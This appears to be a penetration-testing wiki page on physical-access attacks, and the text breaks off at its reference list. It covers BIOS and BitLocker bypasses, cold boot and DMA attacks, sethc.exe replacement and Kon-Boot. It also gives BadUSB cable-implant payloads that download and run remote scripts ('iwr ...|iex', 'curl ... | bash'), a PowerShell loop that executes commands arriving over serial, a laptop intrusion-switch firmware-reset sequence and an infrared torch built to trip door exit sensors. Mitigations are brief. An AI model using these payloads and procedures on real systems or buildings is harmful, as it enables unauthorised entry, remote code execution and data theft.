  \n**Resetting the BIOS** can be achieved in several ways. Most motherboards include a **battery** that, when removed for\
  \ around **30 minutes**, will reset the BIOS settings, including the password. Alternatively, a **jumper on the motherboard**\
  \ can be adjusted to reset these settings by connecting specific pins.\n\nFor situations where hardware adjustments are\
  \ not possible or practical, **software tools** offer a solution. Running a system from a **Live CD/USB** with distributions\
  \ like **Kali Linux** provides access to tools like **_killCmos_** and **_CmosPWD_**, which can assist in BIOS password\
  \ recovery.\n\nIn cases where the BIOS password is unknown, entering it incorrectly **three times** will typically result\
  \ in an error code. This code can be used on websites like [https://bios-pw.org](https://bios-pw.org) to potentially retrieve\
  \ a usable password.\n\n### UEFI Security\n\nFor modern systems using **UEFI** instead of traditional BIOS, the tool **chipsec**\
  \ can be utilized to analyze and modify UEFI settings, including the disabling of **Secure Boot**. This can be accomplished\
  \ with the following command:\n\n```bash\npython chipsec_main.py -module exploits.secure.boot.pk\n```\n\n---\n\n## RAM Analysis\
  \ and Cold Boot Attacks\n\nRAM retains data briefly after power is cut, usually for **1 to 2 minutes**. This persistence\
  \ can be extended to **10 minutes** by applying cold substances, such as liquid nitrogen. During this extended period, a\
  \ **memory dump** can be created using tools like **dd.exe** and **volatility** for analysis.\n\n---\n\n## Direct Memory\
  \ Access (DMA) Attacks\n\n**INCEPTION** is a tool designed for **physical memory manipulation** through DMA, compatible\
  \ with interfaces like **FireWire** and **Thunderbolt**. It allows for bypassing login procedures by patching memory to\
  \ accept any password. However, it's ineffective against **Windows 10** systems.\n\n---\n\n## Live CD/USB for System Access\n\
  \nChanging system binaries like **_sethc.exe_** or **_Utilman.exe_** with a copy of **_cmd.exe_** can provide a command\
  \ prompt with system privileges. Tools such as **chntpw** can be used to edit the **SAM** file of a Windows installation,\
  \ allowing password changes.\n\n**Kon-Boot** is a tool that facilitates logging into Windows systems without knowing the\
  \ password by temporarily modifying the Windows kernel or UEFI. More information can be found at [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).\n\
  \n---\n\n## Handling Windows Security Features\n\n### Boot and Recovery Shortcuts\n\n- **Supr**: Access BIOS settings.\n\
  - **F8**: Enter Recovery mode.\n- Pressing **Shift** after the Windows banner can bypass autologon.\n\n### BAD USB Devices\n\
  \nDevices like **Rubber Ducky** and **Teensyduino** serve as platforms for creating **bad USB** devices, capable of executing\
  \ predefined payloads when connected to a target computer.\n\n### Volume Shadow Copy\n\nAdministrator privileges allow for\
  \ the creation of copies of sensitive files, including the **SAM** file, through PowerShell.\n\n## BadUSB / HID Implant\
  \ Techniques\n\n### Wi-Fi managed cable implants\n\n- ESP32-S3 based implants such as **Evil Crow Cable Wind** hide inside\
  \ USB-A→USB-C or USB-C↔USB-C cables, enumerate purely as a USB keyboard, and expose their C2 stack over Wi-Fi. The operator\
  \ only needs to power the cable from the victim host, create a hotspot named `Evil Crow Cable Wind` with password `123456789`,\
  \ and browse to [http://cable-wind.local/](http://cable-wind.local/) (or its DHCP address) to reach the embedded HTTP interface.\n\
  - The browser UI provides tabs for *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, and\
  \ *Config*. Stored payloads are tagged per OS, keyboard layouts are switched on the fly, and VID/PID strings can be altered\
  \ to mimic known peripherals.\n- Because the C2 lives inside the cable, a phone can stage payloads, trigger execution, and\
  \ manage Wi-Fi credentials without touching the host OS—ideal for short dwell-time physical intrusions.\n\n### OS-aware\
  \ AutoExec payloads\n\n- AutoExec rules bind one or more payloads to fire immediately after USB enumeration. The implant\
  \ performs lightweight OS fingerprinting and selects the matching script.\n- Example workflow:\n  - *Windows:* `GUI r` →\
  \ `powershell.exe` → `STRING powershell -nop -w hidden -c \"iwr http://10.0.0.1/drop.ps1|iex\"` → `ENTER`.\n  - *macOS/Linux:*\
  \ `COMMAND SPACE` (Spotlight) or `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.\n\
  - Because execution is unattended, simply swapping a charging cable can achieve “plug-and-pwn” initial access under the\
  \ logged-on user context.\n\n### HID-bootstrapped remote shell over Wi-Fi TCP\n\n1. **Keystroke bootstrap:** A stored payload\
  \ opens a console and pastes a loop that executes whatever arrives on the new USB serial device. A minimal Windows variant\
  \ is:\n\n```powershell\n$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'\n$port.Open(); while($true){$cmd=$port.ReadLine();\
  \ if($cmd){Invoke-Expression $cmd}}\n```\n\n2. **Cable bridge:** The implant keeps the USB CDC channel open while its ESP32-S3\
  \ launches a TCP client (Python script, Android APK, or desktop executable) back to the operator. Any bytes typed into the\
  \ TCP session are forwarded into the serial loop above, giving remote command execution even on air-gapped hosts. Output\
  \ is limited, so operators typically run blind commands (account creation, staging additional tooling, etc.).\n\n### HTTP\
  \ OTA update surface\n\n- The same web stack usually exposes unauthenticated firmware updates. Evil Crow Cable Wind listens\
  \ on `/update` and flashes whatever binary is uploaded:\n\n```bash\ncurl -F \"file=@firmware.ino.bin\" http://cable-wind.local/update\n\
  ```\n\n- Field operators can hot-swap features (e.g., flash USB Army Knife firmware) mid-engagement without opening the\
  \ cable, letting the implant pivot to new capabilities while still plugged into the target host.\n\n## Bypassing BitLocker\
  \ Encryption\n\nBitLocker encryption can potentially be bypassed if the **recovery password** is found within a memory dump\
  \ file (**MEMORY.DMP**). Tools like **Elcomsoft Forensic Disk Decryptor** or **Passware Kit Forensic** can be utilized for\
  \ this purpose.\n\n---\n\n## Social Engineering for Recovery Key Addition\n\nA new BitLocker recovery key can be added through\
  \ social engineering tactics, convincing a user to execute a command that adds a new recovery key composed of zeros, thereby\
  \ simplifying the decryption process.\n\n---\n\n## Exploiting Chassis Intrusion / Maintenance Switches to Factory-Reset\
  \ the BIOS\n\nMany modern laptops and small-form-factor desktops include a **chassis-intrusion switch** that is monitored\
  \ by the Embedded Controller (EC) and the BIOS/UEFI firmware.  While the primary purpose of the switch is to raise an alert\
  \ when a device is opened, vendors sometimes implement an **undocumented recovery shortcut** that is triggered when the\
  \ switch is toggled in a specific pattern.\n\n### How the Attack Works\n\n1. The switch is wired to a **GPIO interrupt**\
  \ on the EC.\n2. Firmware running on the EC keeps track of the **timing and number of presses**.\n3. When a hard-coded pattern\
  \ is recognised, the EC invokes a *mainboard-reset* routine that **erases the contents of the system NVRAM/CMOS**.\n4. On\
  \ next boot, the BIOS loads default values – **supervisor password, Secure Boot keys, and all custom configuration are cleared**.\n\
  \n> Once Secure Boot is disabled and the firmware password is gone, the attacker can simply boot any external OS image and\
  \ obtain unrestricted access to the internal drives.\n\n### Real-World Example – Framework 13 Laptop\n\nThe recovery shortcut\
  \ for the Framework 13 (11th/12th/13th-gen) is:\n\n```text\nPress intrusion switch  →  hold 2 s\nRelease               \
  \  →  wait 2 s\n(repeat the press/release cycle 10× while the machine is powered)\n```\n\nAfter the tenth cycle the EC sets\
  \ a flag that instructs the BIOS to wipe NVRAM at the next reboot.  The whole procedure takes ~40 s and requires **nothing\
  \ but a screwdriver**.\n\n### Generic Exploitation Procedure\n\n1. Power-on or suspend-resume the target so the EC is running.\n\
  2. Remove the bottom cover to expose the intrusion/maintenance switch.\n3. Reproduce the vendor-specific toggle pattern\
  \ (consult documentation, forums, or reverse-engineer the EC firmware).\n4. Re-assemble and reboot – firmware protections\
  \ should be disabled.\n5. Boot a live USB (e.g. Kali Linux) and perform usual post-exploitation (credential dumping, data\
  \ exfiltration, implanting malicious EFI binaries, etc.).\n\n### Detection & Mitigation\n\n* Log chassis-intrusion events\
  \ in the OS management console and correlate with unexpected BIOS resets.\n* Employ **tamper-evident seals** on screws/covers\
  \ to detect opening.\n* Keep devices in **physically controlled areas**; assume that physical access equals full compromise.\n\
  * Where available, disable the vendor “maintenance switch reset” feature or require an additional cryptographic authorisation\
  \ for NVRAM resets.\n\n---\n\n## Covert IR Injection Against No-Touch Exit Sensors\n\n### Sensor Characteristics\n- Commodity\
  \ “wave-to-exit” sensors pair a near-IR LED emitter with a TV-remote style receiver module that only reports logic high\
  \ after it has seen multiple pulses (~4–10) of the correct carrier (≈30 kHz).\n- A plastic shroud blocks the emitter and\
  \ receiver from looking directly at each other, so the controller assumes any validated carrier came from a nearby reflection\
  \ and drives a relay that opens the door strike.\n- Once the controller believes a target is present it often changes the\
  \ outbound modulation envelope, but the receiver keeps accepting any burst that matches the filtered carrier.\n\n### Attack\
  \ Workflow\n1. **Capture the emission profile** – clip a logic analyser across the controller pins to record both the pre-detection\
  \ and post-detection waveforms that drive the internal IR LED.\n2. **Replay only the “post-detection” waveform** – remove/ignore\
  \ the stock emitter and drive an external IR LED with the already-triggered pattern from the outset. Because the receiver\
  \ only cares about pulse count/frequency, it treats the spoofed carrier as a genuine reflection and asserts the relay line.\n\
  3. **Gate the transmission** – transmit the carrier in tuned bursts (e.g., tens of milliseconds on, similar off) to deliver\
  \ the minimum pulse count without saturating the receiver’s AGC or interference handling logic. Continuous emission quickly\
  \ desensitises the sensor and stops the relay from firing.\n\n### Long-Range Reflective Injection\n- Replacing the bench\
  \ LED with a high-power IR diode, MOSFET driver, and focusing optics enables reliable triggering from ~6 m away.\n- The\
  \ attacker does not need line-of-sight to the receiver aperture; aiming the beam at interior walls, shelving, or door frames\
  \ that are visible through glass lets reflected energy enter the ~30° field of view and mimics a close-range hand wave.\n\
  - Because the receivers expect only weak reflections, a much stronger external beam can bounce off multiple surfaces and\
  \ still remain above the detection threshold.\n\n### Weaponised Attack Torch\n- Embedding the driver inside a commercial\
  \ flashlight hides the tool in plain sight. Swap the visible LED for a high-power IR LED matched to the receiver’s band,\
  \ add an ATtiny412 (or similar) to generate the ≈30 kHz bursts, and use a MOSFET to sink the LED current.\n- A telescopic\
  \ zoom lens tightens the beam for range/precision, while a vibration motor under MCU control gives haptic confirmation that\
  \ modulation is active without emitting visible light.\n- Cycling through several stored modulation patterns (slightly different\
  \ carrier frequencies and envelopes) increases compatibility across rebranded sensor families, letting the operator sweep\
  \ reflective surfaces until the relay audibly clicks and the door releases.\n\n---\n\n## References\n\n- [Pentest Partners\
